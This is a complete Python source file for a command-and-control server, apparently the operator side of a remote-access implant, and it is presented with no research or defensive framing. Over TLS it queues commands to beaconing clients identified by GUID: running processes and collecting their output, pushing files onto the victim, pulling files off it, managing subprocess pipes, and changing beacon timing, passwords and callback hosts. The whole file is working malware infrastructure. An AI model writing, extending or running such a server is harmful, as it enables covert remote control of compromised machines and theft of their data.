import os
import ssl
import time
import threading
import queue
from http.server import BaseHTTPRequestHandler, HTTPServer

# File where we store the current security password
SECURITY_PASSWORD_FILE = "security_password.txt"

def load_security_password():
    if os.path.exists(SECURITY_PASSWORD_FILE):
        with open(SECURITY_PASSWORD_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    else:
        # Default password if file doesn't exist
        pw = "test"
        with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:
            f.write(pw)
        return pw

def store_security_password(new_password):
    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:
        f.write(new_password)

# Global security password loaded at startup
SECURITY_PASSWORD = load_security_password()

command_queue = queue.Queue()
post_received_event = threading.Event()
connected_guids = {}

# We already store filenames using fileFrom[guid].
fileFrom = {}

# Now we'll store "pending new passwords" here, keyed by guid
pending_passwords = {}

COMMANDS = {
    0x00: "Authentication",
    0x01: "Execute process",
    0x02: "Execute with output collection",
    0x03: "Download file",
    0x04: "Upload file",
    0x05: "Create Subprocess",
    0x06: "Close Subprocess",
    0x07: "Subprocess pipe in/out",
    0x08: "Set TimeLong",
    0x09: "Set TimeShort",
    0x0A: "Set new Security password",
    0x0B: "Set Host(s)"
}

def log_to_file(message, filename="c2_server.log"):
    with open(filename, "a", encoding="utf-8") as log_file:
        log_file.write(f"{message}\n")

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        log_to_file(f"{self.address_string()} - - [{self.log_date_time_string()}] {format % args}")

    def do_GET(self):
        """
        The client periodically hits GET to retrieve the next command + payload.
        If the command_queue is empty, we send 0x00 (Authentication + current SECURITY_PASSWORD).
        Otherwise, we pop the next command from the queue, build the response, and send it.
        """
        global SECURITY_PASSWORD
        guid = self.headers.get("Title") or "UnknownGUID"
        connected_guids[guid] = time.time()

        command_len = 0
        response_body = b""

        if command_queue.empty():
            # Default command: 0x00 => "Authentication" + current SECURITY_PASSWORD
            response_command = 0x00
            payload = SECURITY_PASSWORD.encode("utf-16-le") + b"\x00\x00"
            response_body = bytes([response_command]) + payload
            command_len = len(response_body)
        else:
            command, *args = command_queue.get()
            response_command = command

            if response_command == 0x03:
                # Download file (server -> client)
                file_path, client_path = args
                try:
                    with open(file_path, "rb") as f:
                        file_data = f.read()
                    path_utf16 = client_path.encode("utf-16-le") + b"\x00\x00"
                    response_body = bytes([response_command]) + path_utf16 + file_data
                    command_len = len(response_body)
                    log_to_file(f"Queued Download: {file_path} -> client:{client_path}")
                except Exception as e:
                    log_to_file(f"Download file error: {e}")

            elif response_command == 0x04:
                # Upload file (client -> server)
                file_path, client_path = args
                fileFrom[guid] = file_path
                path_utf16 = client_path.encode("utf-16-le") + b"\x00\x00"
                response_body = bytes([response_command]) + path_utf16
                command_len = len(response_body)

            elif response_command == 0x0A:
                # Set new Security password
                # The user typed something like: "a NewPassword123"
                # We'll store that "NewPassword123" in a dict, keyed by the guid
                new_password = " ".join(args)  # or "".join(args) if you prefer
                pending_passwords[guid] = new_password

                payload_utf16 = new_password.encode("utf-16-le") + b"\x00\x00"
                response_body = bytes([response_command]) + payload_utf16
                command_len = len(response_body)
                log_to_file(f"Set new Security password queued for {guid}: {new_password}")

            else:
                # For other commands, just encode all args in UTF‑16
                combined_args = " ".join(args)
                payload_utf16 = combined_args.encode("utf-16-le") + b"\x00\x00"
                response_body = bytes([response_command]) + payload_utf16
                command_len = len(response_body)

        self.send_response(200)
        self.send_header("Title", command_len)
        self.end_headers()

        # Log the raw body and a human-readable decode
        log_to_file(f"GET -> Title: {command_len}")
        log_to_file(f"GET -> Body raw: {response_body}")
        log_to_file(f"GET -> Body: {decode_body(response_body)}")

        self.wfile.write(response_body)

    def do_POST(self):
        """
        The client posts back data for certain commands.
        - 0x04 => The client is uploading a file to server.
        - 0x0A => The client is acknowledging a new password? (We do a 'live' change here).
        - etc.
        """
        global SECURITY_PASSWORD
        guid = self.headers.get("Title", "NoGuid")
        content_length = int(self.headers.get('Content-Length', 0))
        raw_data = self.rfile.read(content_length)

        if not raw_data:
            self.send_response(200)
            self.end_headers()
            return

        command_byte = raw_data[0]

        if command_byte == 0x04:
            # Upload file chunk from client -> server
            if fileFrom.get(guid) != "DONE":
                filename = fileFrom.get(guid)
                if filename:
                    with open(filename, "wb") as f:
                        # For example, skip first 2 bytes if needed (depends on your actual protocol)
                        f.write(raw_data[2:])
                    log_to_file(f"POST -> Received file chunk from {guid} into {filename}")
                    # Mark done if we only expect a single chunk
                    fileFrom[guid] = "DONE"
                else:
                    log_to_file(f"POST -> No filename to store for guid {guid}. Raw={raw_data}")
            else:
                log_to_file(f"POST -> Already saved file from {guid}: {raw_data}")

        elif command_byte == 0x0A:
            # The client is presumably confirming password was changed
            # We do NOT decode the new pass from the client response,
            # because we already have it in pending_passwords.
            log_to_file(f"POST -> 0x0A from {guid}, raw_data={raw_data}")

            # For example, if the second byte is 0x00 => success
            if len(raw_data) > 1 and raw_data[1] == 0x00:
                new_pass = pending_passwords.get(guid, None)
                if new_pass:
                    SECURITY_PASSWORD = new_pass
                    store_security_password(new_pass)
                    log_to_file(
                        f"POST -> Password changed live for {guid}. Now '{SECURITY_PASSWORD}' is stored."
                    )
                    # Optionally remove it from the dictionary
                    del pending_passwords[guid]
                else:
                    log_to_file(f"POST -> Got 0x0A ack from {guid}, but no pending password found!")
            else:
                log_to_file(f"POST -> 0x0A from {guid}, but second byte != 0x00. Raw={raw_data}")

        elif command_byte == 0x00:
            # Some status or echo
            log_to_file(f"POST -> 0x00 from {guid}. raw_data={raw_data}")

        else:
            # Fallback
            log_to_file(f"POST -> Unknown command={command_byte} from {guid}. raw_data={raw_data}")

        self.send_response(200)
        self.end_headers()

        # Trigger the event to let the command-input thread proceed
        post_received_event.set()

def read_commands():
    """
    Simple loop that waits for any POST from clients, then asks the user
    for the next command. 
    """
    while True:
        post_received_event.wait()
        post_received_event.clear()
        
        user_input = input("Enter a command (hex cmd plus args, e.g. '3 c2_path client_path'): ").strip()
        if user_input:
            parts = user_input.split()
            command = int(parts[0], 16)
            args = parts[1:]
            command_queue.put([command] + args)
            log_to_file(f"Command added: {COMMANDS.get(command, 'Unknown')} {args}")

def decode_file_command(payload: bytes):
    """
    Utility that reads two bytes at a time until we see 0x00 0x00,
    which is used as a delimiter between the path and the raw file data.
    Then decodes that path_bytes as UTF-16-LE.
    """
    path_bytes = bytearray()
    i = 0
    while i + 1 < len(payload):
        if payload[i] == 0x00 and payload[i+1] == 0x00:
            i += 2
            break
        path_bytes.extend(payload[i:i+2])
        i += 2

    path_str = path_bytes.decode("utf-16-le", errors="ignore")
    file_data = payload[i:]
    return path_str, file_data

def decode_body(response_body):
    """
    Debug/logging helper to decode the raw response body
    into a dict describing the command and payload.
    """
    try:
        command_byte = response_body[0]
        command_description = COMMANDS.get(command_byte, "Unknown Command")
        payload = response_body[1:]

        if command_byte in [0x03, 0x04]:
            # File commands
            client_path, file_data = decode_file_command(payload)
            return {
                "Command": command_description,
                "Client Path": client_path,
                "Binary Data Length": len(file_data),
                "Binary Data Preview": file_data[:20],
            }
        else:
            # For other commands, decode entire payload in UTF-16
            decoded_string = payload.decode("utf-16-le", errors="ignore").rstrip("\x00")
            return {
                "Command": command_description,
                "Decoded String": decoded_string,
            }
    except Exception as e:
        return {"Error": str(e)}

def start_c2_server():
    server_address = ('0.0.0.0', 9500)
    httpd = HTTPServer(server_address, C2Handler)

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    print("C2 server running on port 9500...")
    httpd.serve_forever()

if __name__ == "__main__":
    server_thread = threading.Thread(target=start_c2_server, daemon=True)
    server_thread.start()
    read_commands()
